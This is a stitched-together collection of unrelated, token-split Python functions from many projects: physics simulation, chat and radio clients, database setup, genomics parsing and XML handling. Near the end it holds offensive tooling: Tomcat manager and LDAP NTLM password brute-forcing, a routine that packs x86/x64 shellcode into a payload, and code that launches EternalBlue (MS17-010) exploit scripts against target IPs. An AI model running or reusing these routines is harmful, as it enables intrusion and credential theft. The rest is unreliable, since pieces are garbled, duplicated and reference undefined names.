def get params ( target , param , dof ) : return [ target . get Param ( getattr ( ode , 'Param{}{}' . format ( param , s ) ) ) for s in [ '' , '2' , '3' ] [ : dof ] ]
def set params ( target , param , values , dof ) : if not isinstance ( values , ( list , tuple , np . ndarray ) ) : values = [ values ] * dof assert dof == len ( values ) for s , value in zip ( [ '' , '2' , '3' ] [ : dof ] , values ) : target . set Param ( getattr ( ode , 'Param{}{}' . format ( param , s ) ) , value )
def make quaternion ( theta , * axis ) : x , y , z = axis r = np . sqrt ( x * x + y * y + z * z ) st = np . sin ( theta / 2. ) ct = np . cos ( theta / 2. ) return [ x * st / r , y * st / r , z * st / r , ct ]
def center of mass ( bodies ) : x = np . zeros ( 3. ) t = 0. for b in bodies : m = b . mass x += b . body to world ( m . c ) * m . mass t += m . mass return x / t
def positions ( self ) : return [ self . ode obj . get Position ( i ) for i in range ( self . LDOF ) ]
def position rates ( self ) : return [ self . ode obj . get Position Rate ( i ) for i in range ( self . LDOF ) ]
def angles ( self ) : return [ self . ode obj . get Angle ( i ) for i in range ( self . ADOF ) ]
def angle rates ( self ) : return [ self . ode obj . get Angle Rate ( i ) for i in range ( self . ADOF ) ]
def axes ( self ) : return [ np . array ( self . ode obj . get Axis ( i ) ) for i in range ( self . ADOF or self . LDOF ) ]
def axes ( self ) : return [ np . array ( self . ode obj . get Axis1 ( ) ) , np . array ( self . ode obj . get Axis2 ( ) ) ]
def create bodies ( self , translate = ( 0 , 1 , 0 ) , size = 0.1 ) : stack = [ ( 'root' , 0 , self . root [ 'position' ] + translate ) ] while stack : name , depth , end = stack . pop ( ) for child in self . hierarchy . get ( name , ( ) ) : stack . append ( ( child , depth + 1 , end + self . bones [ child ] . end ) ) if name not in self . bones : continue bone = self . bones [ name ] body = self . world . create body ( 'box' , name = bone . name , density = self . density , lengths = ( size , size , bone . length ) ) body . color = self . color # move the center of the body to the halfway point between # the parent (joint) and child (joint). x , y , z = end - bone . direction * bone . length / 2 # swizzle y and z -- asf uses y as up, but we use z as up. body . position = x , z , y # compute an orthonormal (rotation) matrix using the ground and # the body. this is mind-bending but seems to work. u = bone . direction v = np . cross ( u , [ 0 , 1 , 0 ] ) l = np . linalg . norm ( v ) if l > 0 : v /= l rot = np . vstack ( [ np . cross ( u , v ) , v , u ] ) . T swizzle = [ [ 1 , 0 , 0 ] , [ 0 , 0 , 1 ] , [ 0 , - 1 , 0 ] ] body . rotation = np . dot ( swizzle , rot ) self . bodies . append ( body )
def create joints ( self ) : stack = [ 'root' ] while stack : parent = stack . pop ( ) for child in self . hierarchy . get ( parent , ( ) ) : stack . append ( child ) if parent not in self . bones : continue bone = self . bones [ parent ] body = [ b for b in self . bodies if b . name == parent ] [ 0 ] for child in self . hierarchy . get ( parent , ( ) ) : child bone = self . bones [ child ] child body = [ b for b in self . bodies if b . name == child ] [ 0 ] shape = ( '' , 'hinge' , 'universal' , 'ball' ) [ len ( child bone . dof ) ] self . joints . append ( self . world . join ( shape , body , child body ) )
def joint torques ( self ) : return as flat array ( getattr ( j , 'amotor' , j ) . feedback [ - 1 ] [ : j . ADOF ] for j in self . joints )
def labels ( self ) : return sorted ( self . channels , key = lambda c : self . channels [ c ] )
def process data ( self ) : self . visibility = self . data [ : , : , 3 ] self . positions = self . data [ : , : , : 3 ] self . velocities = np . zeros like ( self . positions ) + 1000 for frame no in range ( 1 , len ( self . data ) - 1 ) : prev = self . data [ frame no - 1 ] next = self . data [ frame no + 1 ] for c in range ( self . num markers ) : if - 1 < prev [ c , 3 ] < 100 and - 1 < next [ c , 3 ] < 100 : self . velocities [ frame no , c ] = ( next [ c , : 3 ] - prev [ c , : 3 ] ) / ( 2 * self . world . dt ) self . cfms = np . zeros like ( self . visibility ) + self . DEFAULT CFM
def create bodies ( self ) : self . bodies = { } for label in self . channels : body = self . world . create body ( 'sphere' , name = 'marker:{}' . format ( label ) , radius = 0.02 ) body . is kinematic = True body . color = 0.9 , 0.1 , 0.1 , 0.5 self . bodies [ label ] = body
def forward dynamics ( self , torques , start = 0 , states = None ) : if states is not None : self . skeleton . set body states ( states ) for frame no , torque in enumerate ( torques ) : if frame no < start : continue if frame no >= end : break self . ode space . collide ( None , self . on collision ) self . skeleton . add torques ( torque ) self . ode world . step ( self . dt ) yield self . ode contactgroup . empty ( )
def render ( self , dt ) : for frame in self . frozen : for body in frame : self . draw body ( body ) for body in self . world . bodies : self . draw body ( body ) if hasattr ( self . world , 'markers' ) : # draw line between anchor1 and anchor2 for marker joints. window . gl Color4f ( 0.9 , 0.1 , 0.1 , 0.9 ) window . gl Line Width ( 3 ) for j in self . world . markers . joints . values ( ) : window . gl Begin ( window . GL LINES ) window . gl Vertex3f ( * j . get Anchor ( ) ) window . gl Vertex3f ( * j . get Anchor2 ( ) ) window . gl End ( )
def response status string ( code ) : mean = HTTP STATUS CODES . get ( code , 'unknown' ) . upper ( ) return '{code} {mean}' . format ( code = code , mean = mean )
def fetch ( self ) : try : if not self . last message id : messages = self . connection . get ( "room/%s/recent" % self . room id , key = "messages" , parameters = { "limit" : 1 } ) self . last message id = messages [ - 1 ] [ "id" ] messages = self . connection . get ( "room/%s/recent" % self . room id , key = "messages" , parameters = { "since message id" : self . last message id } ) except : messages = [ ] if messages : self . last message id = messages [ - 1 ] [ "id" ] self . received ( messages )
def connection Made ( self ) : headers = [ "GET %s HTTP/1.1" % ( "/room/%s/live.json" % self . factory . get stream ( ) . get room id ( ) ) ] connection headers = self . factory . get stream ( ) . get connection ( ) . get headers ( ) for header in connection headers : headers . append ( "%s: %s" % ( header , connection headers [ header ] ) ) headers . append ( "Host: streaming.campfirenow.com" ) self . transport . write ( "\r\n" . join ( headers ) + "\r\n\r\n" ) self . factory . get stream ( ) . set protocol ( self )
def styles ( self ) : styles = get all styles ( ) whitelist = self . app . config . get ( 'CSL STYLES WHITELIST' ) if whitelist : return { k : v for k , v in styles . items ( ) if k in whitelist } return styles
def init app ( self , app ) : state = Invenio CSLREST State ( app ) app . extensions [ 'invenio-csl-rest' ] = state return state
def build chunk headers ( self ) : if hasattr ( self , " chunk headers" ) and self . chunk headers : return self . chunk headers = { } for field in self . files : self . chunk headers [ field ] = self . headers ( field , True ) for field in self . data : self . chunk headers [ field ] = self . headers ( field )
def str to path ( s , result type ) : assert isinstance ( s , str ) if isinstance ( s , bytes ) and result type is text type : return s . decode ( 'ascii' ) elif isinstance ( s , text type ) and result type is bytes : return s . encode ( 'ascii' ) return s
def path root ( draw , result type ) : # Based on https://en.wikipedia.org/wiki/Path (computing) def tp ( s = '' ) : return str to path ( s , result type ) if os . name != 'nt' : return tp ( os . sep ) sep = sampled from ( [ os . sep , os . altsep or os . sep ] ) . map ( tp ) name = filename ( result type ) char = characters ( min codepoint = ord ( "A" ) , max codepoint = ord ( "z" ) ) . map ( lambda c : tp ( str ( c ) ) ) relative = sep # [drive letter]:\ drive = builds ( lambda * x : tp ( ) . join ( x ) , char , just ( tp ( ':' ) ) , sep ) # \\?\[drive spec]:\ extended = builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , drive ) network = one of ( [ # \\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , name , sep , name , sep ) , # \\?\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , name , sep , name , sep ) , # \\?\UNC\[server]\[sharename]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '?' ) ) , sep , just ( tp ( 'UNC' ) ) , sep , name , sep , name , sep ) , # \\.\[physical device]\ builds ( lambda * x : tp ( ) . join ( x ) , sep , sep , just ( tp ( '.' ) ) , sep , name , sep ) , ] ) final = one of ( relative , drive , extended , network ) return draw ( final )
def handle extends ( self , text ) : match = self . re extends . match ( text ) if match : extra text = self . re extends . sub ( '' , text , count = 1 ) blocks = self . get blocks ( extra text ) path = os . path . join ( self . base dir , match . group ( 'path' ) ) with open ( path , encoding = 'utf-8' ) as fp : return self . replace blocks in extends ( fp . read ( ) , blocks ) else : return None
def flush buffer ( self ) : self . code builder . add line ( '{0}.extend([{1}])' , self . result var , ',' . join ( self . buffered ) ) self . buffered = [ ]
def init async ( self , loop = None ) : self . loop = loop or asyncio . get event loop ( ) self . async lock = asyncio . Lock ( loop = loop ) # FIX: SQLITE in memory database if not self . database == ':memory:' : self . state = Connection Local ( )
async def async connect ( self ) : if self . async lock is None : raise Exception ( 'Error, database not properly initialized before async connection' ) async with self . async lock : self . connect ( True ) return self . state . conn
async def async connect ( self ) : if self . waiters is None : raise Exception ( 'Error, database not properly initialized before async connection' ) if self . waiters or self . max connections and ( len ( self . in use ) >= self . max connections ) : waiter = asyncio . Future ( loop = self . loop ) self . waiters . append ( waiter ) try : logger . debug ( 'Wait for connection.' ) await waiter finally : self . waiters . remove ( waiter ) self . connect ( ) return self . state . conn
def generate ( request ) : models . Data Item . create ( content = '' . join ( random . choice ( string . ascii uppercase + string . digits ) for in range ( 20 ) ) ) return muffin . HTTP Found ( '/' )
def scan ( xml ) : if xml . tag is et . Comment : yield { 'type' : COMMENT , 'text' : xml . text } return if xml . tag is et . PI : if xml . text : yield { 'type' : PI , 'target' : xml . target , 'text' : xml . text } else : yield { 'type' : PI , 'target' : xml . target } return obj = elt2obj ( xml ) obj [ 'type' ] = ENTER yield obj assert type ( xml . tag ) is str , xml if xml . text : yield { 'type' : TEXT , 'text' : xml . text } for c in xml : for x in scan ( c ) : yield x if c . tail : yield { 'type' : TEXT , 'text' : c . tail } yield { 'type' : EXIT }
def unscan ( events , nsmap = None ) : root = None last closed elt = None stack = [ ] for obj in events : if obj [ 'type' ] == ENTER : elt = obj2elt ( obj , nsmap = nsmap ) if stack : stack [ - 1 ] . append ( elt ) elif root is not None : raise Runtime Error ( 'Event stream tried to create second XML tree' ) else : root = elt stack . append ( elt ) last closed elt = None elif obj [ 'type' ] == EXIT : last closed elt = stack . pop ( ) elif obj [ 'type' ] == COMMENT : elt = et . Comment ( obj [ 'text' ] ) stack [ - 1 ] . append ( elt ) elif obj [ 'type' ] == PI : elt = et . PI ( obj [ 'target' ] ) if obj . get ( 'text' ) : elt . text = obj [ 'text' ] stack [ - 1 ] . append ( elt ) elif obj [ 'type' ] == TEXT : text = obj [ 'text' ] if text : if last closed elt is None : stack [ - 1 ] . text = ( stack [ - 1 ] . text or '' ) + text else : last closed elt . tail = ( last closed elt . tail or '' ) + text else : assert False , obj if root is None : raise Runtime Error ( 'Empty XML event stream' ) return root
def parse ( filename ) : for event , elt in et . iterparse ( filename , events = ( 'start' , 'end' , 'comment' , 'pi' ) , huge tree = True ) : if event == 'start' : obj = elt2obj ( elt ) obj [ 'type' ] = ENTER yield obj if elt . text : yield { 'type' : TEXT , 'text' : elt . text } elif event == 'end' : yield { 'type' : EXIT } if elt . tail : yield { 'type' : TEXT , 'text' : elt . tail } elt . clear ( ) elif event == 'comment' : yield { 'type' : COMMENT , 'text' : elt . text } elif event == 'pi' : yield { 'type' : PI , 'text' : elt . text } else : assert False , ( event , elt )
def subtree ( events ) : stack = 0 for obj in events : if obj [ 'type' ] == ENTER : stack += 1 elif obj [ 'type' ] == EXIT : if stack == 0 : break stack -= 1 yield obj
def merge text ( events ) : text = [ ] for obj in events : if obj [ 'type' ] == TEXT : text . append ( obj [ 'text' ] ) else : if text : yield { 'type' : TEXT , 'text' : '' . join ( text ) } text . clear ( ) yield obj if text : yield { 'type' : TEXT , 'text' : '' . join ( text ) }
def setup ( self , app ) : # noqa super ( ) . setup ( app ) # Setup Database self . database . initialize ( connect ( self . cfg . connection , * * self . cfg . connection params ) ) # Fix SQ Lite in-memory database if self . database . database == ':memory:' : self . cfg . connection manual = True if not self . cfg . migrations enabled : return # Setup migration engine self . router = Router ( self . database , migrate dir = self . cfg . migrations path ) # Register migration commands def pw migrate ( name : str = None , fake : bool = False ) : self . router . run ( name , fake = fake ) self . app . manage . command ( pw migrate ) def pw rollback ( name : str = None ) : if not name : name = self . router . done [ - 1 ] self . router . rollback ( name ) self . app . manage . command ( pw rollback ) def pw create ( name : str = 'auto' , auto : bool = False ) : if auto : auto = list ( self . models . values ( ) ) self . router . create ( name , auto ) self . app . manage . command ( pw create ) def pw list ( ) : """List migrations.""" self . router . logger . info ( 'Migrations are done:' ) self . router . logger . info ( '\n' . join ( self . router . done ) ) self . router . logger . info ( '' ) self . router . logger . info ( 'Migrations are undone:' ) self . router . logger . info ( '\n' . join ( self . router . diff ) ) self . app . manage . command ( pw list ) @ self . app . manage . command def pw merge ( ) : """Merge migrations into one.""" self . router . merge ( ) self . app . manage . command ( pw merge )
def startup ( self , app ) : self . database . init async ( app . loop ) if not self . cfg . connection manual : app . middlewares . insert ( 0 , self . middleware )
def cleanup ( self , app ) : if hasattr ( self . database . obj , 'close all' ) : self . database . close all ( )
def register ( self , model ) : self . models [ model . meta . table name ] = model model . meta . database = self . database return model
async def manage ( self ) : cm = Context Manager ( self . database ) if isinstance ( self . database . obj , AIO Database ) : cm . connection = await self . database . async connect ( ) else : cm . connection = self . database . connect ( ) return cm
def not followed by ( parser ) : @ tri def not followed by block ( ) : failed = object ( ) result = optional ( tri ( parser ) , failed ) if result != failed : fail ( [ "not " + fun to str ( parser ) ] ) choice ( not followed by block )
def many until1 ( these , term ) : first = [ these ( ) ] these results , term result = many until ( these , term ) return ( first + these results , term result )
def sep1 ( parser , separator ) : first = [ parser ( ) ] def inner ( ) : separator ( ) return parser ( ) return first + many ( tri ( inner ) )
def fill ( self , size ) : try : for i in range ( size ) : self . buffer . append ( self . source . next ( ) ) except Stop Iteration : self . buffer . append ( ( End Of File , End Of File ) ) self . len = len ( self . buffer )
def next ( self ) : self . index += 1 t = self . peek ( ) if not self . depth : self . cut ( ) return t
def field type ( self ) : if not self . model : return 'JSON' database = self . model . meta . database if isinstance ( database , Proxy ) : database = database . obj if Json and isinstance ( database , Postgresql Database ) : return 'JSON' return 'TEXT'
def python value ( self , value ) : if self . field type == 'TEXT' and isinstance ( value , str ) : return self . loads ( value ) return value
def get fsapi endpoint ( self ) : endpoint = yield from self . session . get ( self . fsapi device url , timeout = self . timeout ) text = yield from endpoint . text ( encoding = 'utf-8' ) doc = objectify . fromstring ( text ) return doc . webfsapi . text
def create session ( self ) : req url = '%s/%s' % ( self . webfsapi , 'CREATE SESSION' ) sid = yield from self . session . get ( req url , params = dict ( pin = self . pin ) , timeout = self . timeout ) text = yield from sid . text ( encoding = 'utf-8' ) doc = objectify . fromstring ( text ) return doc . session Id . text
def call ( self , path , extra = None ) : try : if not self . webfsapi : self . webfsapi = yield from self . get fsapi endpoint ( ) if not self . sid : self . sid = yield from self . create session ( ) if not isinstance ( extra , dict ) : extra = dict ( ) params = dict ( pin = self . pin , sid = self . sid ) params . update ( * * extra ) req url = ( '%s/%s' % ( self . webfsapi , path ) ) result = yield from self . session . get ( req url , params = params , timeout = self . timeout ) if result . status == 200 : text = yield from result . text ( encoding = 'utf-8' ) else : self . sid = yield from self . create session ( ) params = dict ( pin = self . pin , sid = self . sid ) params . update ( * * extra ) result = yield from self . session . get ( req url , params = params , timeout = self . timeout ) text = yield from result . text ( encoding = 'utf-8' ) return objectify . fromstring ( text ) except Exception as e : logging . info ( 'AFSAPI Exception: ' + traceback . format exc ( ) ) return None
def handle set ( self , item , value ) : doc = yield from self . call ( 'SET/{}' . format ( item ) , dict ( value = value ) ) if doc is None : return None return doc . status == 'FS OK'
def handle text ( self , item ) : doc = yield from self . handle get ( item ) if doc is None : return None return doc . value . c8 array . text or None
def handle int ( self , item ) : doc = yield from self . handle get ( item ) if doc is None : return None return int ( doc . value . u8 . text ) or None
def handle long ( self , item ) : doc = yield from self . handle get ( item ) if doc is None : return None return int ( doc . value . u32 . text ) or None
def get power ( self ) : power = ( yield from self . handle int ( self . API . get ( 'power' ) ) ) return bool ( power )
def set power ( self , value = False ) : power = ( yield from self . handle set ( self . API . get ( 'power' ) , int ( value ) ) ) return bool ( power )
def get modes ( self ) : if not self . modes : self . modes = yield from self . handle list ( self . API . get ( 'valid modes' ) ) return self . modes
def get mode list ( self ) : self . modes = yield from self . get modes ( ) return ( yield from self . collect labels ( self . modes ) )
def get volume steps ( self ) : if not self . volume steps : self . volume steps = yield from self . handle int ( self . API . get ( 'volume steps' ) ) return self . volume steps
def get mute ( self ) : mute = ( yield from self . handle int ( self . API . get ( 'mute' ) ) ) return bool ( mute )
def set mute ( self , value = False ) : mute = ( yield from self . handle set ( self . API . get ( 'mute' ) , int ( value ) ) ) return bool ( mute )
def get play status ( self ) : status = yield from self . handle int ( self . API . get ( 'status' ) ) return self . PLAY STATES . get ( status )
def get equalisers ( self ) : if not self . equalisers : self . equalisers = yield from self . handle list ( self . API . get ( 'equalisers' ) ) return self . equalisers
def get equaliser list ( self ) : self . equalisers = yield from self . get equalisers ( ) return ( yield from self . collect labels ( self . equalisers ) )
def set sleep ( self , value = False ) : return ( yield from self . handle set ( self . API . get ( 'sleep' ) , int ( value ) ) )
def parse genotype ( self , vcf fields ) : format col = vcf fields [ 8 ] . split ( ':' ) genome data = vcf fields [ 9 ] . split ( ':' ) try : gt idx = format col . index ( 'GT' ) except Value Error : return [ ] return [ int ( x ) for x in re . split ( r'[\|/]' , genome data [ gt idx ] ) if x != '.' ]
def obj Has Unsaved Changes ( self ) : if not self . obj : return False return self . obj . has Unsaved Changes ( cascade Objects = True )
def items ( self ) : if self . meta type == 'list' : return self . list elif self . meta type == 'dict' : return self . dict . items ( )
def values ( self ) : if self . meta type == 'list' : return self . list elif self . meta type == 'dict' : return self . dict . values ( )
def append ( self , item ) : if self . meta type == 'dict' : raise Assertion Error ( 'Cannot append to object of `dict` base type!' ) if self . meta type == 'list' : self . list . append ( item ) return
def extend ( self , item ) : if self . meta type == 'dict' : raise Assertion Error ( 'Cannot extend to object of `dict` base type!' ) if self . meta type == 'list' : self . list . extend ( item ) return
def json ( self ) : if self . meta type == 'list' : ret = [ ] for dat in self . list : if not isinstance ( dat , composite ) : ret . append ( dat ) else : ret . append ( dat . json ( ) ) return ret elif self . meta type == 'dict' : ret = { } for key in self . dict : if not isinstance ( self . dict [ key ] , composite ) : ret [ key ] = self . dict [ key ] else : ret [ key ] = self . dict [ key ] . json ( ) return ret
def json ( self ) : data = { } for item in self . data : if isinstance ( self . data [ item ] , filetree ) : data [ item ] = self . data [ item ] . json ( ) else : data [ item ] = self . data [ item ] return data
def filelist ( self ) : if len ( self . filelist ) == 0 : for item in self . data : if isinstance ( self . data [ item ] , filetree ) : self . filelist . extend ( self . data [ item ] . filelist ( ) ) else : self . filelist . append ( self . data [ item ] ) return self . filelist
def save ( self ) : if len ( self ) == 0 : return [ ] mdl = self . get Model ( ) return mdl . saver . save ( self )
def render ( self , * args , * * kwargs ) : render to = String IO ( ) self . output ( render to , * args , * * kwargs ) return render to . getvalue ( )
def start tag ( self ) : direct attributes = ( attribute . render ( self ) for attribute in self . render attributes ) attributes = ( ) if hasattr ( self , ' attributes' ) : attributes = ( '{0}="{1}"' . format ( key , value ) for key , value in self . attributes . items ( ) if value ) rendered attributes = " " . join ( filter ( bool , chain ( direct attributes , attributes ) ) ) return '<{0}{1}{2}{3}>' . format ( self . tag , ' ' if rendered attributes else '' , rendered attributes , ' /' if self . tag self closes else "" )
def output ( self , to = None , formatted = False , * args , * * kwargs ) : to . write ( '<!DOCTYPE {0}>' . format ( self . type ) )
def as dict ( self ) : self as dict = dict ( ) self as dict [ 'sequence' ] = self . sequence if hasattr ( self , 'frequency' ) : self as dict [ 'frequency' ] = self . frequency return self as dict
def parse allele data ( self ) : return [ Allele ( sequence = x ) for x in [ self . ref allele ] + self . alt alleles ]
def parse info ( self , info field ) : info = dict ( ) for item in info field . split ( ';' ) : # Info fields may be "foo=bar" or just "foo". # For the first case, store key "foo" with value "bar" # For the second case, store key "foo" with value True. info item data = item . split ( '=' ) # If length is one, just store as a key with value = true. if len ( info item data ) == 1 : info [ info item data [ 0 ] ] = True elif len ( info item data ) == 2 : info [ info item data [ 0 ] ] = info item data [ 1 ] return info
def as dict ( self ) : self as dict = { 'chrom' : self . chrom , 'start' : self . start , 'ref allele' : self . ref allele , 'alt alleles' : self . alt alleles , 'alleles' : [ x . as dict ( ) for x in self . alleles ] } try : self as dict [ 'info' ] = self . info except Attribute Error : pass return self as dict
def as dict ( self , * args , * * kwargs ) : self as dict = super ( Clin Var Allele , self ) . as dict ( * args , * * kwargs ) self as dict [ 'hgvs' ] = self . hgvs self as dict [ 'clnalleleid' ] = self . clnalleleid self as dict [ 'clnsig' ] = self . clnsig self as dict [ 'clndn' ] = self . clndn self as dict [ 'clndisdb' ] = self . clndisdb self as dict [ 'clnvi' ] = self . clnvi return self as dict
def parse frequencies ( self ) : frequencies = Ordered Dict ( [ ( 'EXAC' , 'Unknown' ) , ( 'ESP' , 'Unknown' ) , ( 'TGP' , 'Unknown' ) ] ) pref freq = 'Unknown' for source in frequencies . keys ( ) : freq key = 'AF ' + source if freq key in self . info : frequencies [ source ] = self . info [ freq key ] if pref freq == 'Unknown' : pref freq = frequencies [ source ] return pref freq , frequencies
def parse allele data ( self ) : # Get allele frequencies if they exist. pref freq , frequencies = self . parse frequencies ( ) info clnvar single tags = [ 'ALLELEID' , 'CLNSIG' , 'CLNHGVS' ] cln data = { x . lower ( ) : self . info [ x ] if x in self . info else None for x in info clnvar single tags } cln data . update ( { 'clndisdb' : [ x . split ( ',' ) for x in self . info [ 'CLNDISDB' ] . split ( '|' ) ] if 'CLNDISDB' in self . info else [ ] } ) cln data . update ( { 'clndn' : self . info [ 'CLNDN' ] . split ( '|' ) if 'CLNDN' in self . info else [ ] } ) cln data . update ( { 'clnvi' : self . info [ 'CLNVI' ] . split ( ',' ) if 'CLNVI' in self . info else [ ] } ) try : sequence = self . alt alleles [ 0 ] except Index Error : sequence = self . ref allele allele = Clin Var Allele ( frequency = pref freq , sequence = sequence , * * cln data ) # A few Clin Var variants are only reported as a combination with # other variants, and no single-variant effect is proposed. Skip these. if not cln data [ 'clnsig' ] : return [ ] return [ allele ]
def add ( self , * names ) : def decorator ( blok ) : for name in names or ( blok . name , ) : self [ name ] = blok return blok return decorator
def filter ( filter Obj , * * kwargs ) : for key , value in kwargs . items ( ) : if key . endswith ( ' ne' ) : not Filter = True key = key [ : - 4 ] else : not Filter = False if key not in filter Obj . indexed Fields : raise Value Error ( 'Field "' + key + '" is not in INDEXED FIELDS array. Filtering is only supported on indexed fields.' ) if not Filter is False : filter Obj . filters . append ( ( key , value ) ) else : filter Obj . not Filters . append ( ( key , value ) ) return filter Obj
def delete ( self ) : if self . filters or self . not Filters : return self . mdl . deleter . delete Multiple ( self . all Only Indexed Fields ( ) ) return self . mdl . deleter . destroy Model ( )
def delete By Pk ( self , pk ) : obj = self . mdl . objects . get Only Indexed Fields ( pk ) if not obj : return 0 return self . delete One ( obj )
def string ( html , start on = None , ignore = ( ) , use short = True , * * queries ) : if use short : html = grow short ( html ) return to template ( fromstring ( html ) , start on = start on , ignore = ignore , * * queries )
def file ( file object , start on = None , ignore = ( ) , use short = True , * * queries ) : return string ( file object . read ( ) , start on = start on , ignore = ignore , use short = use short , * * queries )
def filename ( file name , start on = None , ignore = ( ) , use short = True , * * queries ) : with open ( file name ) as template file : return file ( template file , start on = start on , ignore = ignore , use short = use short , * * queries )
def output ( self , to = None , * args , * * kwargs ) : to . write ( str ( self . value ) )
def keep kwargs partial ( func , * args , * * keywords ) : def newfunc ( * fargs , * * fkeywords ) : newkeywords = fkeywords . copy ( ) newkeywords . update ( keywords ) return func ( * ( args + fargs ) , * * newkeywords ) newfunc . func = func newfunc . args = args newfunc . keywords = keywords return newfunc
def overview ( ) : range search = Range Search ( ) ranges = range search . get ranges ( ) if ranges : formatted ranges = [ ] tags lookup = { } for r in ranges : formatted ranges . append ( { 'mask' : r . range } ) tags lookup [ r . range ] = r . tags search = Host . search ( ) search = search . filter ( 'term' , status = 'up' ) search . aggs . bucket ( 'hosts' , 'ip range' , field = 'address' , ranges = formatted ranges ) response = search . execute ( ) print line ( "{0:<18} {1:<6} {2}" . format ( "Range" , "Count" , "Tags" ) ) print line ( "-" * 60 ) for entry in response . aggregations . hosts . buckets : print line ( "{0:<18} {1:<6} {2}" . format ( entry . key , entry . doc count , tags lookup [ entry . key ] ) ) else : print error ( "No ranges defined." )
def round arr teff luminosity ( arr ) : arr [ 'temp' ] = np . around ( arr [ 'temp' ] , - 1 ) arr [ 'lum' ] = np . around ( arr [ 'lum' ] , 3 ) return arr
def main ( ) : services = Service Search ( ) argparse = services . argparser argparse . add argument ( '-f' , '--file' , type = str , help = "File" ) arguments = argparse . parse args ( ) if not arguments . file : print error ( "Please provide a file with credentials seperated by ':'" ) sys . exit ( ) services = services . get services ( search = [ "Tomcat" ] , up = True , tags = [ '!tomcat brute' ] ) credentials = [ ] with open ( arguments . file , 'r' ) as f : credentials = f . readlines ( ) for service in services : print notification ( "Checking ip:{} port {}" . format ( service . address , service . port ) ) url = 'http://{}:{}/manager/html' gevent . spawn ( brutefore passwords , service . address , url . format ( service . address , service . port ) , credentials , service ) service . add tag ( 'tomcat brute' ) service . update ( tags = service . tags ) gevent . wait ( ) # TODO fix stats Logger ( ) . log ( "tomcat brute" , "Performed tomcat bruteforce scan" , { 'scanned services' : len ( services ) } )
def round teff luminosity ( cluster ) : temps = [ round ( t , - 1 ) for t in teff ( cluster ) ] lums = [ round ( l , 3 ) for l in luminosity ( cluster ) ] return temps , lums
def modify data ( data ) : with tempfile . Named Temporary File ( 'w' ) as f : for entry in data : f . write ( json . dumps ( entry . to dict ( include meta = True ) , default = datetime handler ) ) f . write ( '\n' ) f . flush ( ) print success ( "Starting editor" ) subprocess . call ( [ 'nano' , '-' , f . name ] ) with open ( f . name , 'r' ) as f : return f . readlines ( )
def modify input ( ) : doc mapper = Doc Mapper ( ) if doc mapper . is pipe : objects = [ obj for obj in doc mapper . get pipe ( ) ] modified = modify data ( objects ) for line in modified : obj = doc mapper . line to object ( line ) obj . save ( ) print success ( "Object(s) successfully changed" ) else : print error ( "Please use this tool with pipes" )
def bruteforce ( users , domain , password , host ) : cs = Credential Search ( use pipe = False ) print notification ( "Connecting to {}" . format ( host ) ) s = Server ( host ) c = Connection ( s ) for user in users : if c . rebind ( user = "{}\\{}" . format ( domain , user . username ) , password = password , authentication = NTLM ) : print success ( 'Success for: {}:{}' . format ( user . username , password ) ) credential = cs . find object ( user . username , password , domain = domain , host ip = host ) if not credential : credential = Credential ( username = user . username , secret = password , domain = domain , host ip = host , type = "plaintext" , port = 389 ) credential . add tag ( tag ) credential . save ( ) # Add a tag to the user object, so we dont have to bruteforce it again. user . add tag ( tag ) user . save ( ) else : print error ( "Fail for: {}:{}" . format ( user . username , password ) )
def utime ( self , * args , * * kwargs ) : os . utime ( self . extended path , * args , * * kwargs )
def print line ( text ) : try : signal . signal ( signal . SIGPIPE , signal . SIG DFL ) except Value Error : pass try : sys . stdout . write ( text ) if not text . endswith ( '\n' ) : sys . stdout . write ( '\n' ) sys . stdout . flush ( ) except IO Error : sys . exit ( 0 )
def get own ip ( ) : own ip = None interfaces = psutil . net if addrs ( ) for , details in interfaces . items ( ) : for detail in details : if detail . family == socket . AF INET : ip address = ipaddress . ip address ( detail . address ) if not ( ip address . is link local or ip address . is loopback ) : own ip = str ( ip address ) break return own ip
def remove namespace ( doc , namespace ) : ns = u'{%s}' % namespace nsl = len ( ns ) for elem in doc . getiterator ( ) : if elem . tag . startswith ( ns ) : elem . tag = elem . tag [ nsl : ] elem . attrib [ 'oxmlns' ] = namespace
def create payload ( self , x86 file , x64 file , payload file ) : sc x86 = open ( os . path . join ( self . datadir , x86 file ) , 'rb' ) . read ( ) sc x64 = open ( os . path . join ( self . datadir , x64 file ) , 'rb' ) . read ( ) fp = open ( os . path . join ( self . datadir , payload file ) , 'wb' ) fp . write ( b'\x31\xc0\x40\x0f\x84' + pack ( '<I' , len ( sc x86 ) ) ) fp . write ( sc x86 ) fp . write ( sc x64 ) fp . close ( )
def combine files ( self , f1 , f2 , f3 ) : with open ( os . path . join ( self . datadir , f3 ) , 'wb' ) as new file : with open ( os . path . join ( self . datadir , f1 ) , 'rb' ) as file 1 : new file . write ( file 1 . read ( ) ) with open ( os . path . join ( self . datadir , f2 ) , 'rb' ) as file 2 : new file . write ( file 2 . read ( ) )
def detect os ( self , ip ) : process = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'checker.py' ) , str ( ip ) ] , stdout = subprocess . PIPE ) out = process . stdout . decode ( 'utf-8' ) . split ( '\n' ) system os = '' for line in out : if line . startswith ( 'Target OS:' ) : system os = line . replace ( 'Target OS: ' , '' ) break return system os
def exploit single ( self , ip , operating system ) : result = None if "Windows Server 2008" in operating system or "Windows 7" in operating system : result = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'eternalblue exploit7.py' ) , str ( ip ) , os . path . join ( self . datadir , 'final combined.bin' ) , "12" ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) elif "Windows Server 2012" in operating system or "Windows 10" in operating system or "Windows 8.1" in operating system : result = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'eternalblue exploit8.py' ) , str ( ip ) , os . path . join ( self . datadir , 'final combined.bin' ) , "12" ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) else : return [ "System target could not be automatically identified" ] return result . stdout . decode ( 'utf-8' ) . split ( '\n' )
